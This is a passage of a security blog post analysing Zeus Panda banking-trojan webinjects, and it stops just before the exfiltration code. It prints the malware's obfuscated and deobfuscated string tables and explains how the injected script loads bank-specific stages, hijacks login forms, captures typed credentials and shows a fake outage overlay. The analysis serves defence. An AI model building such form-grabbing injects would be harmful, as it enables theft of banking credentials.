<!DOCTYPE html>
<html lang="pt">

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Zeus Panda Webinjects: a case study | cyber.wtf</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/css/bootstrap-3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="/css/main.css">
    <link rel="stylesheet" href="/css/bootstrap-icons-1.5.0/bootstrap-icons.min.css">

    <link rel="shortcut icon" href="/images/favicon.png">

    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed.xml"> 

</head>

    <body>
      <div class="container">

        <header class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <a class="logo-link" href="/">
      <img src="/images/cyber-chrome_slim.png">
    </a>
  </div>
</header>

<div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <div class="menu">
      <ul>
          <li><a href="/">Home</a></li>
          |
          <li><a href="/category" title="Category List">Category List</a>
          <!--<li><a href="/casts">*casts</a></li>-->
          |
          <li><a href="/wtf">WTF?</a></li>
          |
          <li class="rss_feed"><a href="/feed.xml" title="Atom Feed Posts"><i class="bi bi-rss"></i></a></li>
      </ul>
    </div>
  </div>
</div>



        <div class="row">
          <div class="col-lg-8 col-lg-offset-2">
            <main>
            <div class="post">

  <header class="post-header">
    <h1>Zeus Panda Webinjects: a case study</h1>
  </header>

  <article class="post-content">
  <div class="post">

  <header class="post-header">
    <div class="meta">
        Feb 3, 2017
         â¢
            <div class="author-container">
                <span class="author-name">Manuel K.-B.</span><span>, </span>
                
                <div class="author-info deactive">
                  <img src="/images/authors/NA.png" alt="Manuel K.-B.'s Bild">
                  <div class="author-text">
                    <span><h4>Deactivated</h4>
                    <p><del>Manuel K.-B.</del></p>
                    <p><del>Manuel KÃ¶rber-Bilgard</del></p>
                    <p>Deactivated since: 2023 </p>
                  </div>
                </div>
                
            </div>
          
            <div class="author-container">
                <span class="author-name">Karsten Tellmann</span>
                
                <div class="author-info deactive">
                  <img src="/images/authors/NA.png" alt="Karsten Tellmann's Bild">
                  <div class="author-text">
                    <span><h4>Deactivated</h4>
                    <p><del>Karsten Tellmann</del></p>
                    <p><del></del></p>
                    <p>Deactivated since: 2023 </p>
                  </div>
                </div>
                
            </div>
          
        
        
        â¢ <span><a href="/category/#banking" class="reserved">banking</a>,</span><span><a href="/category/#javascript" class="reserved">javascript</a>,</span><span><a href="/category/#panda" class="reserved">panda</a>,</span><span><a href="/category/#trojan" class="reserved">trojan</a>,</span><span><a href="/category/#webinject" class="reserved">webinject</a>,</span><span><a href="/category/#zeus" class="reserved">zeus</a></span>
    </div>
  </header>

  <article class="post-content">
  <p>Our mothership G DATA runs extensive automated sample processing infrastructure as part of providing up to date protection to their AV customers. At G DATA Advanced Analytics, we have integrated these processes within our own routines in order to maintain the fraud detection solutions we provide to our customers from the financial sector.</p>

<p>We have been observing an increase in ZeusÂ Panda infections recently. When we decrypted the config files from samples of ZeusÂ Panda Banking Trojans that went through our processing this week, we decided to have a closer look at the current features. The low level functionality of the Zeus Panda Banking Trojan <a href="https://www.proofpoint.com/us/threat-insight/post/panda-banker-new-banking-trojan-hits-the-market">is already known quite well</a>, so we focus our analysis on the webinjects.Â These webinjects are used to manipulate the functionality of the target online banking websites on the client. The one we found here was pretty interesting. As usual, the JavaScript is protected by an obfuscation layer, which substitutes string and function names using the following mapping array:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">_0x2f90</span> <span class="o">=</span> <span class="p">[</span><span class="dl">""</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x74</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x74</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x79</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x78</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x2F</span><span class="se">\</span><span class="s2">x6A</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x76</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x74</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x63</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x3F</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x3D</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x43</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x64</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x64</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x42</span><span class="se">\</span><span class="s2">x79</span><span class="se">\</span><span class="s2">x54</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x4E</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x76</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x46</span><span class="se">\</span><span class="s2">x46</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x76</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x4C</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x44</span><span class="se">\</span><span class="s2">x4F</span><span class="se">\</span><span class="s2">x4D</span><span class="se">\</span><span class="s2">x43</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x4C</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x64</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x79</span><span class="se">\</span><span class="s2">x53</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x36</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x78</span><span class="se">\</span><span class="s2">x4F</span><span class="se">\</span><span class="s2">x66</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x4C</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x77</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x43</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x41</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x74</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x49</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x36</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x37</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x49</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x37</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x38</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x49</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x38</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x39</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x49</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x39</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x20</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x30</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x49</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x30</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x66</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x66</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x78</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x4F</span><span class="se">\</span><span class="s2">x54</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x52</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x5F</span><span class="se">\</span><span class="s2">x62</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x77</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x2E</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x70</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x42</span><span class="se">\</span><span class="s2">x79</span><span class="se">\</span><span class="s2">x49</span><span class="se">\</span><span class="s2">x64</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x79</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x79</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x6C</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x6E</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x66</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x78</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x64</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x70</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x30</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x78</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x66</span><span class="se">\</span><span class="s2">x74</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x77</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x68</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x30</span><span class="se">\</span><span class="s2">x30</span><span class="se">\</span><span class="s2">x25</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x74</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x7A</span><span class="se">\</span><span class="s2">x49</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x78</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x39</span><span class="se">\</span><span class="s2">x39</span><span class="se">\</span><span class="s2">x39</span><span class="se">\</span><span class="s2">x39</span><span class="se">\</span><span class="s2">x39</span><span class="se">\</span><span class="s2">x39</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x62</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x6B</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x64</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x23</span><span class="se">\</span><span class="s2">x46</span><span class="se">\</span><span class="s2">x46</span><span class="se">\</span><span class="s2">x46</span><span class="se">\</span><span class="s2">x46</span><span class="se">\</span><span class="s2">x46</span><span class="se">\</span><span class="s2">x46</span><span class="dl">"</span><span class="p">];</span>
<span class="c1">// ... further script code ...</span>
</code></pre></div></div>

<p>After deobfuscating this script, the result looks like:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">vars</span> <span class="o">=</span> <span class="p">[</span><span class="dl">""</span><span class="p">,</span> <span class="dl">"</span><span class="s2">done</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">callee</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">script</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">createElement</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">?time=</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">appendChild</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">head</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">getElementsByTagName</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">ver</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">FF</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">addEventListener</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">DOMContentLoaded</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">readyState</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">complete</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">msie 6</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">indexOf</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">toLowerCase</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">userAgent</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">IE6</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">msie 7</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">IE7</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">msie 8</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">IE8</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">msie 9</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">IE9</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">msie 10</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">IE10</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">firefox</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">OTHER</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">_brows.cap</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">getElementById</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">display</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">style</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">none</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">html</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">position</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">fixed</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">top</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">0px</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">left</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">width</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">100%</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">height</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">zIndex</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">999999</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">background</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">#FFFFFF</span><span class="dl">"</span><span class="p">];</span>
<span class="c1">// ... further script code ...</span>
</code></pre></div></div>

<p>Taking a closer look at the now revealed functionality, we can identify the following features:</p>
<ul>
  <li>Browser version check, to add a browser specific event listener (e.g. for Firefox the <em>DOMContentLoaded</em> event is used)</li>
  <li>Setting some trojan configuration variables like:
    <ul>
      <li>botid: Unique Identifier of the compromised system</li>
      <li>inject: URL to load the next attack stage</li>
    </ul>
  </li>
  <li>Load and execute further target (bank) specific JavaScript code, as defined in the inject variable.</li>
</ul>

<p>AsÂ it turns out, the first webinject stage is a generic loader to get target specific attack code from a web server. In this context âtargetâ refers to banks and payment service providers. This is not a remarkable fact in itself, as current webinjects tend to load the final attack in multiple stages. But maybe this server also includes further Zeus Panda components. So letâs take a closer look.</p>

<h2 id="target-specific-code-and-examples">Target specific code and examples</h2>
<p>After downloading the target specific second stage of the webinject, we were surprised about the actual size of the file: 91.8 KB.
A brief analysis showed a lot of functionality. Some of the functions are generic and work on every website. Others include target specific code, like specific HTML attributes. For example, the webinject uses unique id attributes to identify concrete websites of the online banking target. We are still investigating a lot of the included functionality at theÂ time of writing. For now, we want to give a brief overview of selected parts of the basic functionality.</p>

<figure class="figure-posts" style="width: 85%; display:block; margin: auto; margin-bottom: 1em;">
  <div class="image-container" id="/images/posts/2017/02/init_function_start.png"> 
    <a href="#img/images/posts/2017/02/init_function_start.png">
      <img src="/images/posts/2017/02/init_function_start.png" alt="Graphic showing a flowchart of the init function" class="img-responsive" />
      </a>
      <a href="#/images/posts/2017/02/init_function_start.png" class="lightbox" id="img/images/posts/2017/02/init_function_start.png">
        <span style="background-image: url(/images/posts/2017/02/init_function_start.png)"></span>
      </a>
      <figcaption class="figcaption-posts">Figure 1:Â Flowchart of init function</figcaption>
    </div>
  </figure>

<p>After loading the target specific JavaScript, the init function shown in figure [Figure 1] is called. First, the function checks if it is on top of the page. If not, the <em>showpage()</em> function is called, searches for the identifier <em>_brows.cap</em> and deletes thisÂ DOM elementÂ if present. Otherwise the next check function <em>are()</em>Â is called, which searches for the strings <em>âloginâ</em>, <em>âpasswordâ</em> and <em>âbuttonâ</em>. If none of these strings can be found, the <em>get()</em> function is called to check if the user is currently logged in. This is done by checking for the presence of the logout element, which is only available when the user is currently logged in. If not, the already described <em>showpage()</em> function is triggered to clean up. Otherwise the <em>status()</em> function is used to set the status variable to the string <em>âCPâ</em>. Afterwards the collected data is exfiltrated via the <em>send()</em> function, described in detail in the next section.</p>

<p>If all target strings were found (<em>âloginâ</em>, <em>âpasswordâ</em> and <em>âbuttonâ</em>), the next functions <em>preventDefault()</em> and <em>stopPropagation()</em> are called (left branch of figure 1). This overwrites the the default form action to collect the data the user enters into the form. Additionally the key event of the enter button (key code 13) is intercepted so that the form data is captured regardless of the submit method.</p>

<p>As this implementation is not working in Internet Explorer, the script checks for the presence of the <em>cancelBubble</em> event. If present, a specific Internet Explorer implementation is called, which provides the same functionality as the <em>stopPropagation()</em> function. As in the initial webinject, different code is available to support all major browsers.</p>

<p>After collecting form input data, the function <em>status()</em> is called to set the branch variable. The branch variable defines which action is triggered. In our callflow example (left branch), the value is set to the string â<em>SL</em>â which triggers a visible overlay of the website, indicating to the user that there is a temporary problem with the site. The following examples show two different target variations:</p>

<figure class="figure-posts" style="width: 85%; display:block; margin: auto; margin-bottom: 1em;">
  <div class="image-container" id="/images/posts/2017/02/screen_status_sl_02.png"> 
    <a href="#img/images/posts/2017/02/screen_status_sl_02.png">
      <img src="/images/posts/2017/02/screen_status_sl_02.png" alt="Graphic showing a temporarily unavailable message in German" class="img-responsive" />
      </a>
      <a href="#/images/posts/2017/02/screen_status_sl_02.png" class="lightbox" id="img/images/posts/2017/02/screen_status_sl_02.png">
        <span style="background-image: url(/images/posts/2017/02/screen_status_sl_02.png)"></span>
      </a>
      <figcaption class="figcaption-posts">Figure 2: German example for a temporarily unavailable</figcaption>
    </div>
  </figure>

<figure class="figure-posts" style="width: 65%; display:block; margin: auto; margin-bottom: 1em;">
  <div class="image-container" id="/images/posts/2017/02/screen_status_sl1.png"> 
    <a href="#img/images/posts/2017/02/screen_status_sl1.png">
      <img src="/images/posts/2017/02/screen_status_sl1.png" alt="Graphic showing a temporarily unavailable message in English" class="img-responsive" />
      </a>
      <a href="#/images/posts/2017/02/screen_status_sl1.png" class="lightbox" id="img/images/posts/2017/02/screen_status_sl1.png">
        <span style="background-image: url(/images/posts/2017/02/screen_status_sl1.png)"></span>
      </a>
      <figcaption class="figcaption-posts">Figure 3: English example of a different target</figcaption>
    </div>
  </figure>

<p>Afterwards the <em>send()</em> function is triggered to exfiltrate the collected data.</p>

<h2 id="exfiltration">Exfiltration</h2>
<p>The next interesting part in the code is the exfiltration function used during this attack stage. The collected information is handed to a function called <em>send()</em>:</p>

